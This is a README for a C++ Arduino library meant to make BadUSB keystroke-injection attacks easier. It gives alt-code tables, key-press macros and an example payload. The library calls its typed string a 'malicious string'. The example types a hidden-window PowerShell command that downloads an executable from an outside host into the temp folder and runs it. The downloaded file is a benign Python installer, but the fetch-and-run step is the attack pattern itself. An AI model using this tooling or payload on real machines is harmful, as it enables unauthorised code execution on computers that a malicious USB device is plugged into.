# EasyBadUsb
simple header only lib written in C++ to make BadUsb scripting easier (Arduino IDE)

### tested only on ATmega32u4 (HW-374) Arduino Leonardo or Micro
![screen](images/dis.jpg)
[image from github.com/ElijahCuff/HW-374](https://github.com/ElijahCuff/HW-374)

# v2 with alt codes (only for Windows)

### first, include alt.hpp in your sketch file
```cpp
#include "alt.hpp"
```

### then between BEGIN() ... END() we write our commands
```cpp
BEGIN()

//
// commands
//

END()
```

### lowercase input on any keyboard layout expense of alt codes (only works on Windows)

#### supported characters (eng letters, numbers and basic special characters)

```cpp
static const alt_code alt_codes_array[] = {
    {' ', 32},  {'B', 66},  {'C', 67},  {'D', 68},  {'E', 69},  {'F', 70},
    {'G', 71},  {'H', 72},  {'I', 73},  {'J', 74},  {'K', 75},  {'L', 76},
    {'M', 77},  {'N', 78},  {'O', 79},  {'P', 80},  {'Q', 81},  {'R', 82},
    {'S', 83},  {'T', 84},  {'U', 85},  {'V', 86},  {'W', 87},  {'X', 88},
    {'Y', 89},  {'Z', 90},  {'a', 97},  {'b', 98},  {'c', 99},  {'d', 100},
    {'e', 101}, {'f', 102}, {'g', 103}, {'h', 104}, {'i', 105}, {'j', 106},
    {'k', 107}, {'l', 108}, {'m', 109}, {'n', 110}, {'o', 111}, {'p', 112},
    {'q', 113}, {'r', 114}, {'s', 115}, {'t', 116}, {'u', 117}, {'v', 118},
    {'w', 119}, {'x', 120}, {'y', 121}, {'z', 122}, {'0', 48},  {'1', 49},
    {'2', 50},  {'3', 51},  {'4', 52},  {'5', 53},  {'6', 54},  {'7', 55},
    {'8', 56},  {'9', 57},  {'!', 33},  {'"', 34},  {'#', 35},  {'$', 36},
    {'%', 37},  {'&', 38},  {'\'', 39}, {'(', 40},  {')', 41},  {'*', 42},
    {'+', 43},  {',', 44},  {'-', 45},  {'.', 46},  {'/', 47},  {':', 58},
    {';', 59},  {'<', 60},  {'=', 61},  {'>', 62},  {'?', 63},  {'@', 64},
    {'[', 91},  {'\\', 92}, {']', 93},  {'^', 94},  {'_', 95},  {'`', 96},
    {'{', 123}, {'|', 124}, {'}', 125}, {'~', 126}, {'A', 65}};
```

#### alt codes lib functional

```cpp
    const char *payload_str = "powershell -windowstyle hidden..."; // malicious string

    // void alt_print(const char *str, size_t t_sleep)
    alt_print(payload_str, 0); // (malicious_string, sleep time for enter next char)
    /* sleep time for enter next char.. because i had problems on Windows 7
    that the system was unable to process alt codes, on Win 10/11 work well */
```





#### buttons definitions
```cpp
#define MKEY_LEFT_CTRL (0x0001 << 0x00)
#define MKEY_LEFT_WIN (0x0001 << 0x01)
#define MKEY_LEFT_SHIFT (0x0001 << 0x02)
#define MKEY_LEFT_ALT (0x0001 << 0x03)
#define MKEY_ENTER (0x0001 << 0x04)

#define MKEY_LEFT_ARROW (0x0001 << 0x05)
#define MKEY_RIGHT_ARROW (0x0001 << 0x06)

#define MKEY_CH_R (0x0001 << 0x07)
#define MKEY_CH_A (0x0001 << 0x08)
#define MKEY_CH_C (0x0001 << 0x09)

#define MKEY_FN_4 (0x0001 << 0x0A)
```

### The PRESS functions is used to press special keys and simultaneously press several keys on the keyboard
```cpp
// #define PRESS(BTNS, t_sleep)
PRESS(MKEY_LEFT_CTRL | MKEY_LEFT_SHIFT | MKEY_ENTER, 200) // (buttons to be pressed, sleep time for press next button)

// #define PRESS_KRELALL(BTNS, t_sleep, t_wait)
PRESS_KRELALL(MKEY_LEFT_WIN | MKEY_CH_R, 200, 500) // (buttons to be pressed, sleep time for press next button, sleep time to release the buttons)

// bool release_btn(const uint8_t button)
release_btn(MKEY_ENTER) // (buttons to be released)

// void tprint(const char *str, size_t t_sleep)
tprint("echo Hello World!", 30) // (string, sleep time for enter next char), default print (NOT ALT)

// #define WAIT(ms)
WAIT(500) // delay 500 ms
```

### example
```cpp
#include "alt.hpp"

BEGIN()

    const char *str = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"
    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/py_install.exe'); %temp%/py_install.exe";

    RUN_ENTER(str, 0)

END()
```

### demo
[![demo](https://img.youtube.com/vi/Osa8dZCe86s/0.jpg)](https://www.youtube.com/watch?v=Osa8dZCe86s)

